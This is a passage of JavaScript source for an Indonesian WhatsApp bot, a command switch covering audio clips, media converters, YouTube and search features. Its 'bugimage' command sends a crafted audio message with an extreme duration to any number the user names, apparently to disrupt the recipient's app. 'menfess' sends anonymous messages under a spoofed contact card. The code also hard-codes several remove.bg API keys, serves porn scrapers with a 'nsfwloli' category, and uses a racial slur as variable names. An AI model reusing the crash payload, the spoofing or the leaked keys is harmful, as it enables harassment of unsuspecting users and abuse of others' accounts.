            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
                            hisoka.sendMessage(m.chat, waitv2, { quoted: m })

            let media = await hisoka.downloadMediaMessage(qmsg)
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            hisoka.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
            }
            break
case prefix+'sound1':
case prefix+'sound2':
case prefix+'sound3':
case prefix+'sound4':
case prefix+'sound5':
case prefix+'sound6':
case prefix+'sound7':
case prefix+'sound8':
case prefix+'sound9':
case prefix+'sound10':
case prefix+'sound11':
case prefix+'sound12':
case prefix+'sound13':
case prefix+'sound14':
case prefix+'sound15':
case prefix+'sound16':
case prefix+'sound17':
case prefix+'sound18':
case prefix+'sound19':
case prefix+'sound20':
case prefix+'sound21':
case prefix+'sound22':
case prefix+'sound23':
case prefix+'sound24':
case prefix+'sound25':
case prefix+'sound26':
case prefix+'sound27':
case prefix+'sound28':
case prefix+'sound29':
case prefix+'sound30':
case prefix+'sound31':
case prefix+'sound32':
case prefix+'sound33':
case prefix+'sound34':
case prefix+'sound35':
case prefix+'sound36':
case prefix+'sound37':
case prefix+'sound38':
case prefix+'sound39':
case prefix+'sound40':
case prefix+'sound41':
case prefix+'sound42':
case prefix+'sound43':
case prefix+'sound44':
case prefix+'sound45':
case prefix+'sound46':
case prefix+'sound47':
case prefix+'sound48':
case prefix+'sound49':
case prefix+'sound50':
case prefix+'sound51':
case prefix+'sound52':
case prefix+'sound53':
case prefix+'sound54':
case prefix+'sound55':
case prefix+'sound56':
case prefix+'sound57':
case prefix+'sound58':
case prefix+'sound59':
case prefix+'sound60':
case prefix+'sound61':
case prefix+'sound62':
case prefix+'sound63':
case prefix+'sound64':
case prefix+'sound65':
case prefix+'sound66':
case prefix+'sound67':
case prefix+'sound68':
case prefix+'sound69':
case prefix+'sound70':
case prefix+'sound71':
case prefix+'sound72':
case prefix+'sound73':
case prefix+'sound74':
case prefix+'sound75':
case prefix+'sound76':
case prefix+'sound77':
case prefix+'sound78':
case prefix+'sound79':
case prefix+'sound80':
case prefix+'sound81':
case prefix+'sound82':
case prefix+'sound83':
case prefix+'sound84':
case prefix+'sound85':
case prefix+'sound86':
case prefix+'sound87':
case prefix+'sound88':
case prefix+'sound89':
case prefix+'sound90':
case prefix+'sound91':
case prefix+'sound92':
case prefix+'sound93':
case prefix+'sound94':
case prefix+'sound95':
case prefix+'sound96':
case prefix+'sound97':
case prefix+'sound98':
case prefix+'sound99':
case prefix+'sound100':
case prefix+'sound101':
case prefix+'sound102':
case prefix+'sound103':
case prefix+'sound104':
case prefix+'sound105':
case prefix+'sound106':
case prefix+'sound107':
case prefix+'sound108':
case prefix+'sound109':
case prefix+'sound110':
case prefix+'sound111':
case prefix+'sound112':
case prefix+'sound113':
case prefix+'sound114':
case prefix+'sound115':
case prefix+'sound116':
case prefix+'sound117':
case prefix+'sound118':
case prefix+'sound119':
case prefix+'sound120':
case prefix+'sound121':
case prefix+'sound122':
case prefix+'sound123':
case prefix+'sound124':
case prefix+'sound125':
case prefix+'sound126':
case prefix+'sound127':
case prefix+'sound128':
case prefix+'sound129':
case prefix+'sound130':
case prefix+'sound131':
case prefix+'sound132':
case prefix+'sound133':
case prefix+'sound134':
case prefix+'sound135':
case prefix+'sound136':
case prefix+'sound137':
case prefix+'sound138':
case prefix+'sound139':
case prefix+'sound140':
case prefix+'sound141':
case prefix+'sound142':
case prefix+'sound143':
case prefix+'sound144':
case prefix+'sound145':
case prefix+'sound146':
case prefix+'sound147':
case prefix+'sound148':
case prefix+'sound149':
case prefix+'sound150':
case prefix+'sound151':
case prefix+'sound152':
case prefix+'sound153':
case prefix+'sound154':
case prefix+'sound155':
case prefix+'sound156':
case prefix+'sound157':
case prefix+'sound158':
case prefix+'sound159':
case prefix+'sound160':
case prefix+'sound161': {
zens_dev = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/${command}.mp3`)
 hisoka.sendMessage(m.chat, { audio: zens_dev, mimetype: 'audio/mp4', ptt: true }, { quoted: fgif })     
}
break
          case prefix+'bansos':  case prefix+'anjay': case prefix+'ara-ara': case prefix+'ara-ara-cowok': case prefix+'ara-ara2': case prefix+'arigatou': case prefix+'assalamualaikum': case prefix+'asu': case prefix+'ayank': case prefix+'aku-ngakak': case prefix+'bacot': case prefix+'bahagia-aku': case prefix+'baka': case prefix+'beat-box': case prefix+'beat-box2': case prefix+'biasalah': case prefix+'bidadari': case prefix+'bot': case prefix+'buka-pintu': case prefix+'canda-anjing': case prefix+'cepetan': case prefix+'china': case prefix+'cuekin-terus': case prefix+'daisuki-dayo': case prefix+'daisuki': case prefix+'dengan-mu': case prefix+'gaboleh-gitu': case prefix+'gak-lucu': case prefix+'gamau': case prefix+'gay': case prefix+'gelay': case prefix+'gitar': case prefix+'gomenasai': case prefix+'hai-bot': case prefix+'hampa': case prefix+'hayo': case prefix+'hp-iphone': case prefix+'i-like-you': case prefix+'ih-wibu': case prefix+'india': case prefix+'karna-lo-wibu': case prefix+'kiss','kontol': case prefix+'ku-coba': case prefix+'maju-wibu': case prefix+'makasih': case prefix+'mastah': case prefix+'nande-nande': case prefix+'nani': case prefix+'ngadi-ngadi': case prefix+'nikah': case prefix+'nuina': case prefix+'onichan': case prefix+'owner-sange': case prefix+'ownerku': case prefix+'pak-sapardi': case prefix+'pale': case prefix+'pantek': case prefix+'pasi-pasi': case prefix+'punten': case prefix+'sayang': case prefix+'siapa-sih': case prefix+'sudah-biasa': case prefix+'summertime': case prefix+'tanya-bapak-lu': case prefix+'to-the-bone': case prefix+'wajib': case prefix+'waku': case prefix+'woi': case prefix+'yamete': case prefix+'yowaimo': case prefix+'yoyowaimo': {
let vn = await getBuffer(`https://github.com/saipulanuar/Api-Github/raw/main/audio/${command}.mp3`)
hisoka.sendMessage(m.chat,
{ audio: vn, mimetype:'audio/mpeg', ptt: true }, {quoted: m})
}
break
            case prefix+'togif': {
                if (!/webp/.test(mime)) throw `Reply stiker dengan caption *${prefix + command}*`
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

		        let { webp2mp4File } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await hisoka.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            }
            break
	        case prefix+'tourl': {
                                hisoka.sendMessage(m.chat, waitv2, { quoted: m })

		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await hisoka.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            }
            break
            case prefix+'imagenobg': case prefix+'removebg': case prefix+'remove-bg': {
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await hisoka.downloadAndSaveMediaMessage(qmsg, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	                    hisoka.sendMessage(m.chat, waitv2, { quoted: m })

	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    hisoka.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
	    }
	    break
	    case prefix+'sn': {
	    	    const { createHash } = require('crypto')
	        let sn = createHash('md5').update(m.sender).digest('hex')
    m.reply(prefix + 'unreg ' + sn)
}
break
	    case prefix+'reg': case prefix+'daftar': case prefix+'register': {
	    const { createHash } = require('crypto')
let Reg = /\|?(.*)([.|] *?)([0-9]*)$/i
  let user = global.db.data.users[m.sender] 
  if (user.registered === true) throw `Kamu sudah terdaftar\nMau daftar ulang? ${prefix}unreg <SERIAL NUMBER>`
  if (!Reg.test(text)) throw `contoh:\n*${prefix + command} manusia.16*`
  let [_, name, splitter, age] = text.match(Reg)
  if (!name) throw 'Nama tidak boleh kosong (Alphanumeric)'
  if (!age) throw 'Umur tidak boleh kosong (Angka)'
  age = parseInt(age)
  if (age > 50) throw 'Umur terlalu tua'
  if (age < 5) throw 'Bayi bisa ngetik sesuai format bjir ._., tapi gatau juga bocil skrg epic² pasti anak ngen ngep:v'
  user.name = name.trim()
  user.age = age
  user.regTime = + new Date
  user.registered = true
  let sn = createHash('md5').update(m.sender).digest('hex')
  hisoka.sendMessage(m.chat, { text: `
┌─「 *daftar berhasil* 」
├ nama: ${name}
├ umur: ${age}
└────  

*SN* (Serial Number) di kirim di chat pribadi dan digunakan untuk daftar ulang, jika lupa *SN* silahkan ketik *${prefix}sn* untuk mengecek *SN* kamu! 
` }, { quoted: fgclink })
hisoka.sendMessage(m.sender, {text: `*SN:* ${sn}`}, m)
}
break
	    case prefix+'groupsearch': {
	    if (!text) throw 'Masukan nama grup nya!'
	    let gc = await hxz.linkwa(text)
	    let teks = 'Result from '+text+'\n\n'
	    let no = 1
	    for (let i of gc) {
	         teks += `${no++}\n\nNama Grup: ${i.nama}\nLink: ${i.link}\n\n\n`
	         }
	    hisoka.sendMessage(m.chat, { text: teks }, { quoted: m })
	    }
	    break
	    case prefix+'nekopoi': {
 if (!text) throw 'Masukan link nya !'
  let res = await scrape.nekopoi(text)
 hisoka.sendMessage(m.chat, { text: `${res.synopsis}\nList Link Per episode\n${readMore}\n${res.episode_url}`,
 contextInfo: {   
            externalAdReply :{
    mediaUrl: `${res.thumb}`,
    renderLargerThumbnail: true,
    mediaType: 1,
    title: `${res.judul}`,
    body: `${res.genre}`,
    thumbnail: await getBuffer(res.thumb),
    sourceUrl: `text`
     }}
  }, { quoted: m })
      }
      break
	    case prefix+'nekopoisearch': {
	    if (!text) throw 'Masukan Teks sebagai title!'
	    let luar = await scrape.nekopoisearch(text)
	    let dalam = []
                for (let i of luar) {
listSerch.push({
title: i.title, rowId: `${prefix}nekopoi ${i.url}`, description: `Author : ${i.info}`})
                }
const sections = [
{
title: "Nekopoi scraper",
rows: dalam
}
]
const listMessage = {
text: `Result of ${text}\nJumlah Yg di tampilkan ${luar.length}`,
footer: `Simple whatsapp Bot Create By Lui`,
title: "",
buttonText: "Ok",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
	    }
	    break
	    case prefix+'film': {
	    if (!text) throw 'Masukan Judul Film Nya !'
	    let lia = await aliya.film(text)
	    let teks = 'Hasil Yg di temukan dari pencarian'+text+'\n\n'
	    let no = 1
	    for (let i of lia) {
	         teks += `${no++}\nJudul: ${i.judul}\nQuality: ${i.quality}\nType: ${i.type}\nUpload At ${i.upload}\nLink: ${i.link}\n\n`
	         }
hisoka.sendMessage(m.chat, {
text: teks, contextInfo: { mentionedJid: [m.sender],
externalAdReply: {
title: `result from ${text}`,
body: ``,
mediaType: 1,                        
thumbnail: await getBuffer(lia[0].thumb),
renderLargerThumbnail: true,                                             
sourceUrl: ``,
mediaUrl: `${lia[0].thumb}`,
}
}
}, { quoted: m })           
 }
            break
        case prefix+'gempanow': {
            let gem = await bochil.gempaNow()
            listSerch = []
            for (let i of gem) {
         listSerch.push({title: `${i.date}`, rowld: ``, description: `${i.location}\n\nLongitude: ${i.longitude}\nLatitude: ${i.latitude}\n${i.magnitude} Magnitude\n${i.depth}`})
            }
            const sections = [
                {
                title: "Klik Untuk Info selebihnya",
                rows: listSerch
                }
                ]
                const listMessage = {
                text: `Hisoka - Morou`,
                footer: `By Ahmad Lui`,
                title: "",
                buttonText: "Gempa Now",
                sections
                }
                hisoka.sendMessage(m.chat, listMessage, { quoted: m })
        }
        break
        case prefix+'nhentaisearch': case prefix+'nhs': {
        if (!text) throw `Masukan Judul nya!`
        let nh = await fetchJson(`https://kizakixdapis.herokuapp.com/nsfw/nHentaiSearch?query=${text}`)
        for (let i of nh.result) {
        nigga.push({ title: i.title, rowld: ``, description: `code : ${i.id}`})
        }
const sections = [
{
title: "Ytsearch",
rows: nigga
}
]
const listMessage = {
text: `Hasil Dari ${text}`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: "click!",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
                  }
            break        
        case prefix+'listkotajadwalsholat': {
        let salat = await bochil.listJadwalSholat
        for (let i of salat) {
        nigga.push({
        title: `Kota ${i.kota}`, rowId: `${prefix}jadwalsholat ${i.kota}`, description: `status: true`})
        }
        const sections = [
{
title: `List Kota`,
rows: nigga
}
]
const listMessage = {
text: `Kotamu gak ada di list ? Tenang Anda bisa juga mengetik .jadwalsholat (nama daerahmu)\nContoh: .jadwalsholat ponorogo`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: "here!",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
                  }
            break        
        case prefix+'jadwalsholat': {
        if (!text) throw `Masukan Nama Daerahmu!`
        let salat = await bochil.jadwalsholat(text)
        su = []
        for (let i of salat.list) {
        su.push({
        title: `Tanggal ${i.date}`, rowld: ``, description: `\n\nImsyak: ${i.imsyak}\nSubuh: ${i.shubuh}\nTerbit: ${i.terbit}\nDhuha: ${i.dhuha}\nDzuhur: ${i.dzuhur}\nAshr: ${i.ashr}\nMaghrib: ${i.magrib}\nIsyak: ${i.isyak}\n`})
        }
const sections = [
{
title: `${salat.date}`,
rows: su
}
]
const listMessage = {
text: `${salat.date}\n\nShubuh: ${salat.today.Shubuh}\nDzuhur: ${salat.today.Dzuhur}\nAshr: ${salat.today.Ashr}\nMaghrib: ${salat.today.Maghrib}\nIsyak: ${salat.today.Isya}\n`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: "List Lainnya",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
                  }
            break
        case prefix+'joox': {
        if (!text) throw `Masukin query teks\nContoh : ${prefix}joox ngeliyo`
        let jok = await scrape.joox(text)
        listJox = []
        let no = 0
        for (let i of jok.data) {        
        listJox.push({ title: i.lagu, rowId: `${prefix}jooxget ${i.mp3}|${i.lagu} by ${i.penyanyi}`, description: `Penyanyi: ${i.penyanyi} / Album: ${i.album} / publish: ${i.publish}`})
        }
const sections = [
{
title: `${jok.data.length} Hasil Tertampilkan`,
rows: listJox
}
]
const listMessage = {
text: `Result from ${text}`,
footer: `Simple whatsapp Bot - Create By ©AhmdLui`,
title: "",
buttonText: "Klik!",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:fgclink})
                  }
            break        
        case prefix+'jooxget': {
        let [link, judul] = text.split`|`
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
            hisoka.sendMessage(m.chat, {
                document: { url: link }, 
                 mimetype: 'audio/mpeg', 
                 fileName: `${judul}.mp3`, 
                 }, { quoted: m })                 
            }
            break
        case prefix+'randomnsfw': {
               let bkp = [{ anime: 'ass' },{ anime: 'bdsm' },{ anime: 'blowjob' },{ anime: 'boobjob' },{ anime: 'cum' },{ anime: 'creampie' },{ anime: 'cuckold' },{ anime: 'ero' },{ anime: 'elves' },{ anime: 'femdom' },{ anime: 'gangbang' },{ anime: 'glasses' },{ anime: 'hentai' },{ anime: 'incest' },{ anime: 'masturbation' },{ anime: 'pantsu' },{ anime: 'orgy' },{ anime: 'tentacles' },{ anime: 'thighs' },{ anime: 'uniform' },{ anime: 'yuri' },{ anime: 'ahegao' },{ anime: 'pussy' },{ anime: 'nsfwloli' },{ anime: 'zettai' },{ anime: 'foot' }]
               let cuks = []
           for (let i of bkp) {
           cuks.push({
           title: i.anime, rowId: `${i.anime}`, description: ``})
           }
const sections = [
{
title: "list random Nsfw image",
rows: cuks
}
]
const listMessage = {
text: `Turu`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: "T_T",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
                  }
            break           
        case prefix+'randomanime': {               
               let wibu =  [{ anime: 'waifu2'},{ anime: 'shota'},{ anime: 'yotsuba'},{ anime: 'shinomiya'},{ anime: 'yumeko'},{ anime: 'tejina'},{ anime: 'chiho'},{ anime: 'boruto'},{ anime: 'kaori'},{ anime: 'shizuka'},{ anime: 'kaga'},{ anime: 'kotori'},{ anime: 'mikasa'},{ anime: 'akiyama'},{ anime: 'gremory'},{ anime: 'isuzu'},{ anime: 'shina'},{ anime: 'kagura'},{ anime: 'shinka'},{ anime: 'eba'},{ anime: 'elaina'},{ anime: 'erza'},{ anime: 'hinata'},{ anime: 'minato'},{ anime: 'naruto'},{ anime: 'sagiri'},{ anime: 'nezuko'},{ anime: 'rize'},{ anime: 'ana'},{ anime: 'deidara'},{ anime: 'yuki'},{ anime: 'asuna'},{ anime: 'ayuzawa'},{ anime: 'chitoge'},{ anime: 'emilia'},{ anime: 'hestia'},{ anime: 'inori'},{ anime: 'itachi'},{ anime: 'madara'},{ anime: 'sakura'},{ anime: 'sasuke'},{ anime: 'tsunade'},{ anime: 'onepiece'},{ anime: 'mobil'},{ anime: 'montor'},{ anime: 'keneki'},{ anime: 'toukachan'},{ anime: 'akira'},{ anime: 'itori'},{ anime: 'kurumi'},{ anime: 'loli'},{ anime: 'pokemon' }]
               let cuaks = []
           for (let i of wibu) {
           cuaks.push({
           title: i.anime, rowId: `${i.anime}`, description: ``})
           }
const sections = [
{
title: "list random image anime",
rows: cuaks
}
]
const listMessage = {
text: `Create by ©lui`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: "Click here for result",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
                  }
            break           
	    case prefix+'yts': case prefix+'ytsearch': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                listSerch = []
                let teks = 'YouTube Search\n\n Result From '+text+'\n\n'
                let no = 1
                for (let i of search.all) {
listSerch.push({
title: i.title, rowId: `${prefix}play ${i.url}`, description: `Author : ${i.author.name} / ${i.timestamp}`})
                }
const sections = [
{
title: "Ytsearch",
rows: listSerch
}
]
const listMessage = {
text: `Result from ${text}`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: "List Search",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
                  }
            break
            case prefix+'xnxxsearch': {
            if (!text) throw `example: .xnxxssearch milf`
            let lili = await aliya.xnxxsearch(text)
            let lilnus = []
            let teks = 'Xnxx Search\n\n Result From '+text+'\n\n'
            let no = 1
            for (let i of lili.result) {
        lilnus.push({
title: i.title, rowId: `${prefix}xnxxdl ${i.link}`, description: `${i.info}`})
                 }
const sections = [
{
title: "Lagi sange ya bang ?",
rows: lilnus
}
]
const listMessage = {
text: `Hasil Dari ${text}`,
footer: `Simple whatsapp Bot`,
title: "",
buttonText: "Gw udah gakuat",
sections
}
hisoka.sendMessage(m.chat, listMessage, {quoted:m})
        }
        break
        case'menfess':{                      
 if (m.isGroup) return m.reply('Fitur Tidak Dapat Digunakan Untuk Group!')
 let [nomor, pesan] = text.split`|`
 fkntk = {key: {participant: `0@s.whatsapp.net`, ...(m.chat ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `Anda Mendapat pesan Menfess!!`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': global.thumb, thumbnail: global.thumb,sendEphemeral: true}}}
 let he = m.quoted ? m.quoted : m 
 if (!pesan) return m.reply(`reply atau krim caption/gambar & video dengan caption :\n${prefix + command} ${owner[0]}|gaush ribet`)
 if (!nomor) return m.reply(`nomor harus valid`)
 if (/image/.test(mime)) {
 let media = await he.download()
 hisoka.sendMessage(nomor+'@s.whatsapp.net', { image: media, caption: `${pesan}` }, { quoted: fkntk })
 m.reply(mess.success)
 } else if (/video/.test(mime)) {
 let hem = await he.download()
 hisoka.sendMessage(nomor+'@s.whatsapp.net', { video: hem, caption: `${pesan}` }, { quoted: fkntk })
 m.reply(mess.success)
 } else if (/audio/.test(mime)) {
 let jo = await he.download()
 hisoka.sendMessage(nomor+'@s.whatsapp.net', {audio: jo, mimetype:'audio/mpeg', ptt:true }, {quoted:fkntk })
 hisoka.reply(nomor+'@s.whatsapp.net', pesan, m)
 }
  hisoka.sendMessage(nomor+'@s.whatsapp.net', { text: `${pesan}` }, { quoted: fkntk })
 m.reply(mess.success)            
 }
 break
 case prefix+'bugimage': {
 let [nomor, pesan] = text.split`|`
if (!pesan) return m.reply(`reply atau krim caption/gambar & video dengan caption :\n${prefix + command} ${owner[0]}|gaush ribet`)
 if (!nomor) return m.reply(`nomor harus valid`)
 const bugimage = { 
        key: { 
            fromMe: false, 
            participant: `0@s.whatsapp.net`, 
            ...({ remoteJid: "" }) 
        }, 
        "message": {
  "audioMessage": {
"url": "https://mmg.whatsapp.net/d/f/AqXaKHS3AY_ONTjToJq-wEqO11SqPgaAzGLzg02IBAVP.enc",
"mimetype": "audio/aac",
"fileSha256": "3kPrHVqimG+Y7dLgq/q+KPFbZczIgg7SBbuU3UdrinQ=",
"fileLength": "285473",
"seconds": 9999999999,
"caption": `${pesan}`,
"ptt": false,
"mediaKey": "SPVvc1ACQyGfWw8CFuqtQ8RUrv8rsa1JK5AkqcMiPEI=",
"fileEncSha256": "H8EQqzkVWPOvrjoAOGC9FgJkO5KMlScV8+G7ucyVwlo=",
"directPath": "/v/t62.7114-24/35331424_231575432280264_9094348830349350878_n.enc?ccb=11-4&oh=bb04b71d85c088ec24446502b8c52d14&oe=61767ADB",
"mediaKeyTimestamp": "1632753911"
            } 
        } 
    }
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
hisoka.sendMessage(nomor+'@s.whatsapp.net', {image: global.thumb, bugimage }, {quoted: bugimage})
}
break
case prefix+'luitesfitur': {
 let [nomor, pesan] = text.split`|`
if (!pesan) return m.reply(`reply atau krim caption/gambar & video dengan caption :\n${prefix + command} ${owner[0]}|gaush ribet`)
 if (!nomor) return m.reply(`nomor harus valid`)
 hisoka.sendMessage(nomor+'@s.whatsapp.net', {text: `${pesan}` }, {quoted: fgif })
 }
  break
        case prefix+'google': {
                if (!text) throw `Example : ${prefix + command} fatih arridho`
                let google = require('google-it')
                google({'query': text}).then(res => {
                let teks = ` result From : ${text}\n\n`
                for (let g of res) {
                teks += `⭔ *Title* : ${g.title}\n`
                teks += `⭔ *Description* : ${g.snippet}\n`
                teks += `⭔ *Link* : ${g.link}\n\n────────────────────────\n\n`
                } 
                m.reply(teks)
                })
                }
                break
        case prefix+'gimage': {
        if (!text) throw `Example : ${prefix + command} kaori cicak`
        let gis = require('g-i-s')
        gis(text, async (error, result) => {
        n = result
        images = n[Math.floor(Math.random() * n.length)].url
        let buttons = [ {buttonId: `.gimage ${text}`, buttonText: {displayText: 'Lagi'}, type: 1}  ]                
let buttonMessage = {
                 document: { url: images },
                 mimetype: 'image/jpeg',
                 fileName: `${images}.jpg`,
                 caption: `Jika Suka dengan Gambarnya Anda Bisa mendownload File Di atas`,
                 footer: `By Lui`,
                 contextInfo: { mentionedJid: [m.sender],
                 externalAdReply: {
                 title: `Preview Hasil Dari pencarian ${text}`,
                 mediaType: 1,                        
                 thumbnail: await getBuffer(images),
                 renderLargerThumbnail: true,                                             
                 sourceUrl: ``, 
                 mediaUrl: images
                 }
                 },               
                 buttons: buttons,
                 headerType: 4
                 }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
        })
        }
        break
	    case prefix+'play': case prefix+'ytplay': {
                if (!text) throw `Example : ${prefix + command} story wa anime`
                let yts = require("yt-search")
                let search = await yts(text)
                let anu = search.videos[Math.floor(Math.random() * search.videos.length)]
                let buttons = [
                    {buttonId: `${prefix}ytmp3 ${anu.url}`, buttonText: {displayText: '♫ Audio'}, type: 1},
                    {buttonId: `${prefix}ytmp4 ${anu.url}`, buttonText: {displayText: '► Video'}, type: 1}
                ]
                let buttonMessage = {
                    location: { jpegThumbnail: await hisoka.reSize(anu.thumbnail, 300, 150) },
                    caption: `
⭔ Title : ${anu.title}
⭔ Ext : Search
⭔ ID : ${anu.videoId}
⭔ Duration : ${anu.timestamp}
⭔ Viewers : ${anu.views}
⭔ Upload At : ${anu.ago}
⭔ Author : ${anu.author.name}
⭔ Channel : ${anu.author.url}
⭔ Description : ${anu.description}
⭔ Url : ${anu.url}`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4                    
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
            }
            break
       case prefix+'xnxxdl': {
          if (!text) throw `Masukin Link Nya!`
         let ngaceng = await aliya.xnxxdl(text)
                         let buttons = [
                    {buttonId: `.xnxxhigh ${text}`, buttonText: {displayText: 'High'}, type: 1},
                    {buttonId: `.xnxxlow ${text}`, buttonText: {displayText: 'Low'}, type: 1}
                ]
                                let buttonMessage = {
                    location: { jpegThumbnail: await hisoka.reSize(ngaceng.result.image, 300, 150) },
                    caption: `
⭔ Title : ${ngaceng.result.title}
⭔ Url : ${ngaceng.result.URL}`,
                    footer: hisoka.user.name,
                    buttons: buttons,
                    headerType: 4                    
                }
                hisoka.sendMessage(m.chat, buttonMessage, { quoted: m })
           }
           break
           case prefix+'xnxxhigh': {
           let nigga = await aliya.xnxxdl(text)
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
                hisoka.sendMessage(m.chat, {
                 document: { url: nigga.result.files.high }, 
                 mimetype: 'video/mp4', 
                 fileName: `${nigga.result.title}.mp4`, 
                 caption: `${nigga.result.URL}`,
                 contextInfo: { mentionedJid: [m.sender],
                 externalAdReply: {
                 title: `${nigga.result.title}`,
                 mediaType: 1,                        
                 thumbnail: await getBuffer(nigga.result.image),
                 renderLargerThumbnail: true,                                             
                 sourceUrl: text,
                 mediaUrl: text
                 }
                 }
                 }, { quoted: m })
        }
        break
                   case prefix+'xnxxlow': {
           let nigga = await aliya.xnxxdl(text)
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
                hisoka.sendMessage(m.chat, {
                 document: { url: nigga.result.files.low }, 
                 mimetype: 'video/mp4', 
                 fileName: `${nigga.result.title}.mp4`, 
                 caption: `${nigga.result.URL}`,
                 contextInfo: { mentionedJid: [m.sender],
                 externalAdReply: {
                 title: `${nigga.result.title}`,
                 mediaType: 1,                        
                 thumbnail: await getBuffer(nigga.result.image),
                 renderLargerThumbnail: true,                                             
                 sourceUrl: text,
                 mediaUrl: text
                 }
                 }
                 }, { quoted: m })
        }
        break        
	   case prefix+'yta': case prefix+'ytmp3': case prefix+'ytaudio': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 128kbps`                
                let quality = args[1] ? args[1] : '128kbps'
                let media = await yta(text, quality)
                if (media.filesize >= 100000) return m.reply('File Melebihi Batas '+util.format(media))
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
                hisoka.sendMessage(m.chat, {
                 document: { url: media.dl_link }, 
                 mimetype: 'audio/mpeg', 
                 fileName: `${media.title}.mp3`, 
                 caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP3\n⭔ Resolusi : ${args[1] || '128kbps'}`, 
                 jpegThumbnail: await hisoka.reSize(media.thumb, 300, 200)
                 }, { quoted: m })
            }
            break
          case prefix+'ytv':  case prefix+'ytmp4': case prefix+'ytvideo': {
                let { ytv } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=PtFMh6Tccag%27 360p`
                let quality = args[1] ? args[1] : '360p'
                let media = await ytv(text, quality)
                hisoka.sendMessage(m.chat, waitv2, { quoted: m })
                hisoka.sendMessage(m.chat, {
                 document: { url: media.dl_link }, 
                 mimetype: 'video/mp4', 
                 fileName: `${media.title}.mp4`, 
                 caption: `⭔ Title : ${media.title}\n⭔ File Size : ${media.filesizeF}\n⭔ Url : ${isUrl(text)}\n⭔ Ext : MP4\n⭔ Resolusi : ${args[1] || '128kbps'}`, 
                 jpegThumbnail: await hisoka.reSize(media.thumb, 300, 200)
                 }, { quoted: m })

            }
            break
	    case prefix+'getmusic': {
                let { yta } = require('./lib/y2mate')
                if (!text) throw `Example : ${prefix + command} 1`
                if (!m.quoted) return m.reply('Reply Pesan')
                if (!m.quoted.isBaileys) throw `Hanya Bisa Membalas Pesan Dari Bot`
		let urls = quoted.text.match(new RegExp(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch|v|embed|shorts)(?:\.php)?(?:\?.*v=|\/))([a-zA-Z0-9\_-]+)/, 'gi'))
                if (!urls) throw `Mungkin pesan yang anda reply tidak mengandung result ytsearch`
